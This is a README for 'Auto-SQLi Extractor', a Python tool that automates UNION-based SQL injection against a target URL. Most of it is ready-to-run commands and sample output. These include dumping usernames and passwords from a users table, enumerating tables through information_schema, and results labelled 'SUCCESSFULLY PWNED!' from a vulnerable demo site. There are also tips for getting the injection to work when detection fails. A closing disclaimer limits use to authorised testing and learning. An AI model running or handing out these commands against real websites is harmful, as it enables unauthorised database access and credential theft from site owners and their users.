# Auto-SQLi Extractor

**Automated SQL Injection Exploitation Tool** - Detect and extract data from databases

Version 1.0 | Python 3.8+ | MIT License

## Features

- ✅ Auto-detect column count - Uses ORDER BY technique
- ✅ Find displayable columns - Identifies columns for data extraction
- ✅ UNION-based injection - Extracts data from database
- ✅ Preset templates - For common injection types
- ✅ Friendly error messages - Suggests fixes when detection fails
- ✅ Multi-language support - English interface for global users

## Quickstart

### 1. Installation
```bash
pip install -r requirements.txt
```

### 2. View Help
```bash
python main.py --list-presets
python main.py -h
```

### 3. Basic Numeric Injection
```bash
python main.py -u "http://site.com/page.php?id=999" --preset numeric -d "database()"
```

### 4. Extract Data from Table
```bash
python main.py \
  -u "http://site.com/page.php?id=999" \
  --preset numeric \
  -d "group_concat(username,'|',password)" \
  -T "users"
```

---

## Full Documentation

[Full Details] See [USAGE.md](USAGE.md)

In that document:
- Instructions for each injection type
- Real-world examples
- Troubleshooting
- Common SQL functions
- Preset comparison table

---

## Command Syntax

```bash
usage: main.py [-h] [-u URL] [--preset {numeric,quote,...}] 
               [-p PREFIX] [-s SUFFIX] [-d DUMP] [-T TABLE] 
               [--list-presets]

options:
  -u, --url URL           Target URL (required unless using --list-presets)
  --preset {numeric,...}  Injection type to use
  -p, --prefix PREFIX     Context closing character (e.g. ' or ")
  -s, --suffix SUFFIX     Comment syntax (e.g. -- - or #)
  -d, --dump DUMP         SQL to execute [Default: database()]
  -T, --table TABLE       Table name to extract from
  --list-presets          Show available presets
  -h, --help              Show help
```

---

## Injection Presets

| Name | Type | When to Use | Example |
|------|------|-------------|---------|
| `numeric` | UNION-based | Parameter is number | `?id=1` |
| `numeric-comment` | Comment-based | Number + comment | `?id=1` |
| `quote` | Quote-based | String param | `?name=admin` |
| `quote-paren` | Parenthesis | Inside function | `?id=1` |
| `double-quote` | Double-quote | String + " | `?user="admin"` |
| `backtick` | Backtick | Identifier | `` ?id=`1` `` |

---

## Workflow

```
1. Validate URL
   ↓
2. Detect Column Count (ORDER BY)
   ↓
3. Find Displayable Column (UNION SELECT)
   ↓
4. Extract Data
   ↓
5. Output Results
```

---

## Troubleshooting

### Error: "Cannot find column count"
```bash
# Method 1: Change suffix
python main.py -u "http://..." --suffix "-- +" ...

# Method 2: Change preset
python main.py -u "http://..." --preset quote ...

# Method 3: Use non-existent value
python main.py -u "http://site.com/page.php?id=999" ...
```

### Error: "Cannot find Text column"
```bash
# Try different sufixes
--suffix "#"
--suffix "-- +"
--suffix "LIMIT 1"
```

---

## Real World Examples

### Example 1: Get MySQL Version
```bash
$ python main.py -u "http://testphp.vulnweb.com/artists.php?artist=999" --preset numeric

[V] SUCCESSFULLY PWNED! EXTRACTED RESULT:
=========================================
 > 8.0.22-0ubuntu0.20.04.2
=========================================
```

### Example 2: Get List of Tables
```bash
$ python main.py \
  -u "http://testphp.vulnweb.com/artists.php?artist=999" \
  --preset numeric \
  -d "group_concat(table_name)" \
  -T "information_schema.tables"

[V] SUCCESSFULLY PWNED! EXTRACTED RESULT:
=========================================
 > users,products,orders,artists,...
=========================================
```

### Example 3: Get User Data
```bash
$ python main.py \
  -u "http://testphp.vulnweb.com/artists.php?artist=999" \
  --preset numeric \
  -d "group_concat(aname)" \
  -T "artists"

[V] SUCCESSFULLY PWNED! EXTRACTED RESULT:
=========================================
 > r4w8173,Blad3,lyzae
=========================================
```

---

## Disclaimer

[WARNING] ONLY USE FOR LEGAL PURPOSES

This tool is created for:
- Penetration Testing (with permission)
- CTF competitions
- Security Research
- Learning

[FORBIDDEN]
- Attacking systems without permission
- Stealing personal data
- Any illegal activities

The author is NOT responsible for any damage caused.

---

## Requirements

```
requests>=2.28.0
```

---

## License

MIT License - See LICENSE file

---

## 👨‍💻 Author

**tunadafish** - SQL Injection Specialist

---

## 🔗 Resources

- [USAGE Guide](USAGE.md) - Detailed user guide
- [OWASP SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection)
- [PortSwigger SQL Injection](https://portswigger.net/web-security/sql-injection)

---

## ⭐ Pro Tips

1. **Always use non-existent values first** (id=999, id=-1)
2. **Try presets in order:** numeric → quote → numeric-comment
3. **If detection fails:** Try `--suffix "LIMIT 1"` 
4. **For extracting multiple rows:** Use `group_concat()`
5. **Discover other databases:** Check `information_schema.tables`

---

**Made with ❤️ for Security Enthusiasts**

*Auto-SQLi Extractor v1.0 - Automated SQL Injection Exploitation Tool*
